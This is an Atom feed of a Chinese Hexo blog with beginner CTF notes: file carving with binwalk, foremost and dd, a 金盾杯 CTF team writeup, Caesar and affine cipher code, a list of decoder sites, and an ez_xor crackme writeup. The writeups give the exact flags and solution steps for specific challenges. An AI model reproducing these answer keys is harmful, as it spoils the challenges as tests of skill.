title="文件分离操作"></a>文件分离操作</h2><p>1、Binwalk工具<br>binwalk是Linux下用来分析和分离文件的工具，可以快速分辨文件是否有多个文件合并而成，并将文件进行分离，如果分离成功会在目标文件的目录的同目录下生成一个形如<br>_文件名_extracted等文件目录，目录中有分离的文件<br>分析方法: binwalk filename<br>分离方法: binwalk -e filename</p><p>2、foremost<br>如果binwalk无法正确分离除文件，可以使用foremost，将目标文件复制到kali中，成功执行后，会在目标文件的文件目录下生成我们设置的目录，目录中会按文件类型分离出文件<br>用法: foremost 文件名 -o  输出目录名</p><p>3、dd<br>当文件自动分离出错或者因为其他原因无法自动分离时，可以使用dd实现文件手动分离<br>格式: dd  if=源文件  of=目标文件名  bs=1  skip=开始分离的字节数<br>参数说明:<br>if=file    #输入文件名，缺省为标准输入<br>of=file   #输出文件名，缺省为标准输出<br>bs=bytes  #同时设置读写块的大小为bytes,可代替ibs和obs<br>skip=blocks  #从输入文件开头跳过blocks个块后再开始复制</p>    <figure class="figure-image">      <img src="/picture/misc3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这里最后2.txt中内容为12345</p>    <figure class="figure-image">      <img src="/picture/misc4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>真正使用的时候需要配合binwalk使用，binwalk可以分析出文件分离的起始和终止位置</p><p>4、Winhex<br>除了使用dd外，还可以使用winhex实现手动文件分离，将目标文件拖入winhex中，找到要分离的部分，点击复制即可</p><p><font size=1 color="blue">当给定有个txt文件，里面是16进制的压缩包，这时可以使用010editor导入16进制，再保存成压缩包即可</font></p><hr><h2 id="文件合成操作"><a href="#文件合成操作" class="headerlink" title="文件合成操作"></a>文件合成操作</h2><p>Linux下的文件合并<br>linux下通常对文件名相似的文件要进行批量合并<br>格式：cat  合并的文件&gt;输出的文件</p><p>完整性检测:linux下计算文件md5<br>格式:md5sum 文件名<br>(这个操作的原因是因为，你不知道所给部分文件的合并顺序，出题人可能会给出最后合并文件的md5值，这样就可以达到检测合并顺序是否正确的效果)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件类型识别、取证&quot;&gt;&lt;a href=&quot;#文件类型识别、取证&quot; class=&quot;headerlink&quot; title=&quot;文件类型识别、取证&quot;&gt;&lt;/a&gt;文件类型识别、取证&lt;/h2&gt;&lt;p&gt;1、file命令&lt;br&gt;当文件没有后缀名或者有后缀名而无法正常打开时，根据识别出的文</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>金盾杯</title>
    <link href="https://zhangkaibin0921.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/"/>
    <id>https://zhangkaibin0921.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/</id>
    <published>2021-12-12T10:54:28.000Z</published>
    <updated>2022-01-17T08:00:31.569Z</updated>
    
    <content type="html"><![CDATA[<p>这是我的第一次CTF比赛(所有writeup是我们整个队伍的writeup)</p><h3 id="1、hello-world"><a href="#1、hello-world" class="headerlink" title="1、hello_world"></a>1、hello_world</h3><p>拿到文件，看到只有一张图片</p>    <figure class="figure-image">      <img src="/picture/金盾杯/hello1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>常规操作，一般首先查看图片属性</p>    <figure class="figure-image">      <img src="/picture/金盾杯/hello2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>有提示信息666c61677b35383561626436653435316134623466393665636630343036303136376264397d<br>0~f之间，首先猜测是十六进制数（如果不行的话备选方案是Base64）<br>十六进制转字符串得到flag{585abd6e451a4b4f96ecf04060167bd9}</p><p>然后说一下当时我解题时候的想法<br>我拿到一个图片，一般喜欢stegsolve</p>    <figure class="figure-image">      <img src="/picture/金盾杯/hello3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>然后我就看啊看，看到很多类似这种的，我以为图片下面有一个二维码<br>就打开kali</p><p>binwalk + 文件路径/文件名</p><p>foremost+文件路径/文件名<br>发现并没有，然后我就不知道该怎么办了，哈哈</p><hr><h3 id="2、Hi-There"><a href="#2、Hi-There" class="headerlink" title="2、Hi There"></a>2、Hi There</h3><p>拿到文件，里面只有一个txt文档Hhbe1cie93bfTFbcc2hl94e2ea1c91rgab5fei3432Tse498<br>仔细观察看到这串看到这串字符有题目的标题和’F’’l’’a’’g’</p><p><strong>H</strong>hbe1c<strong>i</strong>e93bf<strong>T</strong>Fbcc2<strong>h</strong>l94e2<strong>e</strong>a1c91<strong>r</strong>gab5f<strong>e</strong>i3432Tsesza5498<br>Hhbe1cie93bfT<strong>F</strong>bcc2h<strong>l</strong>94e2e<strong>a</strong>1c91r<strong>g</strong>ab5fei3432Tse498</p><p>且都是隔五个出现一次的，所以就猜测是栏栅加密，且栏数是5</p>    <figure class="figure-image">      <img src="/picture/金盾杯/there1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>但发现只是普通的栏栅加密好像不行<br>试一下枚举解密</p>    <figure class="figure-image">      <img src="/picture/金盾杯/there2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>所以提交flag{b9b91a3ee3c4cb441bce9539cf221f28}</p><p>这道题也说一下我最开始的想法，我是只看到了’f’ ‘l’ ‘a’ ‘g’的，我就在想是换了位置的（因为我没有想到flag最后的字符串最后居然都是没有意义的），我就觉得每一小节字符串后面的数字就是他们换位置的密钥，就这样分组Hhbe1、cie93、bfTFbcc2、hl94、e2、ea1、c91、rgab5、fei3432、Tse498。我之前好像看到过类似于这种的分组加密的这种，但现在找不到了，后面找到了再写上</p><hr><h3 id="3、低音吉他谱"><a href="#3、低音吉他谱" class="headerlink" title="3、低音吉他谱"></a>3、低音吉他谱</h3><p>拿到文件，里面有一张图片和一个txt文档</p>    <figure class="figure-image">      <img src="/picture/金盾杯/music1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/金盾杯/music2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>打开图片，是一张乐谱（暂时看不出什么玄机，猜测会不会是之后通过文本解密后再和乐谱对照得到最终的flag）</p><p>再看看txt文档</p>    <figure class="figure-image">      <img src="/picture/金盾杯/music3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>由大写字母和数字构成猜测是Base32<br>解密后得到的文本由大小写字母和数字组成猜测是Base64<br>再次解密后的文本由大写字母和数字构成猜测是Base32<br>再次解密后的文本由大写字母和数字构成猜测是Base32</p><p>发现全是Base加密，直接上Base全家桶<br><a href="#api">mufeedvh/basecrack: Decode All Bases - Base Scheme Decoder (github.com)</a></p><font size=2>安装教程链接里面有，我就记录一下常用的用法最好在cmd命令行中运行，而不是在git里面在解密的过程中不要在前面多复制了一个空格，否则可能发生错误python  basecrack.py  #输入这个之后回车（是python而不是python3！！），就可以把你要解密的Base输进去，在回车即可python  basecrack.py  -f  file.txt #将你要解密的Base字符放进file.txt文档</font>    <figure class="figure-image">      <img src="/picture/金盾杯/music4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这一步是个关键，用一般的在线加密软件解不出来这个Base85，直接让用户在basecrack里面输入也是解不出来的，在反复尝试之后放到一个文本文档中在进行解密，即可</p>    <figure class="figure-image">      <img src="/picture/金盾杯/music5.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>接着一直解密即可得到flag（在解密的过程中不要在前面多复制了一个空格，否则可能发生错误）<br>(题目中的音谱应该是为了迷惑大家的）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是我的第一次CTF比赛(所有writeup是我们整个队伍的writeup)&lt;/p&gt;
&lt;h3 id=&quot;1、hello-world&quot;&gt;&lt;a href=&quot;#1、hello-world&quot; class=&quot;headerlink&quot; title=&quot;1、hello_world&quot;&gt;&lt;/a&gt;1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>古典密码原理实现</title>
    <link href="https://zhangkaibin0921.github.io/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/"/>
    <id>https://zhangkaibin0921.github.io/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-11-29T09:23:46.000Z</published>
    <updated>2022-01-17T08:00:37.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1、ceasar"><a href="#1、ceasar" class="headerlink" title="1、ceasar"></a>1、ceasar</h1>    <figure class="figure-image">      <img src="/picture/kaisa.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>cipher=<span class="hljs-string">&quot;zhongguo&quot;</span>   <span class="hljs-comment">#明文</span><br>move=<span class="hljs-number">3</span>              <span class="hljs-comment">#移位数</span><br>t=<span class="hljs-string">&quot;&quot;</span>                <span class="hljs-comment">#密文</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+move)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+move)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">else</span>:<br>        t+=i<br><span class="hljs-built_in">print</span>(t)<br>        <br><span class="hljs-comment">#如果要解密的话，秘钥变为负数</span><br><span class="hljs-comment">#如zhongguo加密后得到ckrqjjxr</span><br><span class="hljs-comment">#现需要解密，则直接将move取-3即可</span><br><br></code></pre></td></tr></table></figure><h1 id="2、affine"><a href="#2、affine" class="headerlink" title="2、affine"></a>2、affine</h1>    <figure class="figure-image">      <img src="/picture/affine.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#加密</span><br>cipher=<span class="hljs-string">&#x27;zhongguo&#x27;</span><span class="hljs-comment">#明文</span><br>t=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#密文</span><br>a=<span class="hljs-number">3</span><br>b=<span class="hljs-number">4</span> <span class="hljs-comment">#E(x)=ax+b,gcd(a,26)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+((a*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))+b)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+((a*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))+b)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">else</span>:<br>        t+=i<br><span class="hljs-built_in">print</span>(t)<br><br><br><span class="hljs-comment">#解密</span><br>t = <span class="hljs-string">&#x27;bzurwwmu&#x27;</span>  <span class="hljs-comment"># 密文</span><br>cipher = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 明文</span><br>a = <span class="hljs-number">3</span><br>b = <span class="hljs-number">4</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">26</span>):<br>    <span class="hljs-keyword">if</span> (i*a) % <span class="hljs-number">26</span> == <span class="hljs-number">1</span>:<br>        a1 = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>        cipher += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+((a1*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)-b)) % <span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>        cipher += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+((a1*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)-b)) % <span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">else</span>:<br>        cipher += i<br><span class="hljs-built_in">print</span>(cipher)<br><br>    <br></code></pre></td></tr></table></figure><h1 id="3、多表代换密码"><a href="#3、多表代换密码" class="headerlink" title="3、多表代换密码"></a>3、多表代换密码</h1><p>先说下这个方法必要的基础知识</p><p>因为解密的时候需要矩阵求逆，所以写下方法，这个是最基本的方法</p>    <figure class="figure-image">      <img src="/picture/keniju1.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>行列式怎么求好像也不太记得了，看个例子应该就能马上想起来了</p>    <figure class="figure-image">      <img src="/picture/keniju2.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>可逆矩阵另一种比较简单一点的求法</p>    <figure class="figure-image">      <img src="/picture/keniju3.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/duobiao.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1、ceasar&quot;&gt;&lt;a href=&quot;#1、ceasar&quot; class=&quot;headerlink&quot; title=&quot;1、ceasar&quot;&gt;&lt;/a&gt;1、ceasar&lt;/h1&gt;
    &lt;figure class=&quot;figure-image&quot;&gt;
      &lt;img src</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Crypto在线解密网站</title>
    <link href="https://zhangkaibin0921.github.io/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/"/>
    <id>https://zhangkaibin0921.github.io/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/</id>
    <published>2021-11-28T12:40:20.000Z</published>
    <updated>2022-01-17T08:00:26.144Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://cmd5.com/">MD5</a><br><a href="http://tool.geekapp.cn/">MD5加密</a><br><a href="http://ctf.bugku.com/tool/railfence">栏栅密码</a><br><a href="http://www.urlencode.com.cn/">url</a><br><a href="http://www.hiencode.com/rot13.html">ROT13</a><br><a href="http://www.txttool.com/t/?id=Mzg1">morse</a><br><a href="http://www.hiencode.com/quoted.html">Quoted-printable</a><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒</a><br><a href="https://quipqiup.com/">进阶凯撒爆破</a><br><a href="https://www.codeeeee.com/encrypt/rabbit.html">Rabbit</a><br><a href="http://tools.jb51.net/jisuanqi/factor_calc">分解质因数</a><br><a href="http://tool.geekapp.cn/base64.php">Base64</a><br><a href="https://ctf.bugku.com/tool/base32">Base32</a><br><a href="https://ctf.bugku.com/tool/base16">Base16</a><br><a href="http://code.mcdvisa.com/">中文电码</a><br><a href="https://www.xiao84.com/tools/103177.html">猪圈密码</a><br><a href="http://www.hiencode.com/uu.html">UUencode</a><br><a href="https://www.sojson.com/hexadecimal.html">十六进制转文本</a><br><a href="https://www.bugku.com/tools/jsfuck/#">jsfuck</a><br><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a><br><a href="http://hi.pcmoe.net/buddha.html">与佛论禅+MD5+兽音+熊音+AES+BASE64</a><br><a href="http://www.hiencode.com/cvencode.html">核心价值观</a><br><a href="https://www.qqxiuzi.cn/bianma/rot5-13-18-47.php">ROT5/13/18/47编码转换</a><br><a href="http://tool.bugku.com/peigen/">培根加密</a><br><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚加密</a><br><a href="https://www.sojson.com/encrypt.html">AES</a><br><a href="https://tool.oschina.net/encode?type=4">Unicode、UTF-8、ASCII、URL</a></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://cmd5.com/&quot;&gt;MD5&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://tool.geekapp.cn/&quot;&gt;MD5加密&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://ctf.bugku.com/tool/railfence&quot;&gt;栏栅密码&lt;</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>reverse ez_xor writeup</title>
    <link href="https://zhangkaibin0921.github.io/2021/11/28/reverse-ez-xor-writeup/"/>
    <id>https://zhangkaibin0921.github.io/2021/11/28/reverse-ez-xor-writeup/</id>
    <published>2021-11-28T11:17:01.000Z</published>
    <updated>2022-01-17T07:59:33.530Z</updated>
    
    <content type="html"><![CDATA[<p>拿到ez_xor.exe附件直接丢进PE<br><img src="https://img-blog.csdnimg.cn/2a919819266940108748e2605589b227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以看到是64位exe文件，丢进ida64<br>Shift+F12查看字符串（如果是笔记本电脑的话，F12自带热键，先按Fn，即Fn+Shift+F12）<br><img src="https://img-blog.csdnimg.cn/6204f03ae29740ff9039c7cfc41b3fa8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一般在这里找有没有和flag相关的字符串，可以看到这里是有的，双击进入<br><img src="https://img-blog.csdnimg.cn/064b1084cb0745d6b4beb3bdc19f2c8a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到该字符串，点击上图所示，进入main方法<br>会进入流程图界面，按空格进入文本界面<br>可以看到汇编代码了，按F5（同理如果是笔记本记得按Fn+F5）反汇编，转换成C语言<br><img src="https://img-blog.csdnimg.cn/40c5945e9d804f2a8b9ce453e8960077.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>现在就可以分析代码了，这里的C语言可能数据类型之类的会和我们平时的有点不一样<br>比如说这里的v3=0i64，0i64表示int64_t类型的0，其实就基本上可以理解为0<br>这里代码可以看到关键异或代码while ( (char)(v3 ^ v5[v3]) == dword_403020[v3] )<br><img src="https://img-blog.csdnimg.cn/c717f970db7d4487b7eafd0a6e1f18f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6143bf343b1c42e3a388745da52b5818.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到该字符串每个字符对应的ASCII码（这里按R键即可看到对应的字符）<br>现在已知dword_403020和v3（v3就是0~31），逐个进行异或即可得到flag</p><p>写一个Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6C</span>,<span class="hljs-number">0x69</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x73</span>,<span class="hljs-number">0x72</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x29</span>]<br>flag=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)] <span class="hljs-comment">#从给出的代码很容易看到flag是32位的</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    flag[i]=i^s[i]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>即可得出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;拿到ez_xor.exe附件直接丢进PE&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2a919819266940108748e2605589b227.png?x-oss-process=image/watermark,type_ZHJ</summary>
      
    
    
    
    
    <category term="re" scheme="https://zhangkaibin0921.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://zhangkaibin0921.github.io/2021/10/24/hello-world/"/>
    <id>https://zhangkaibin0921.github.io/2021/10/24/hello-world/</id>
    <published>2021-10-24T08:30:40.072Z</published>
    <updated>2022-01-17T08:00:20.124Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span> <span class="hljs-comment">#双引号里面这篇博客的标题</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
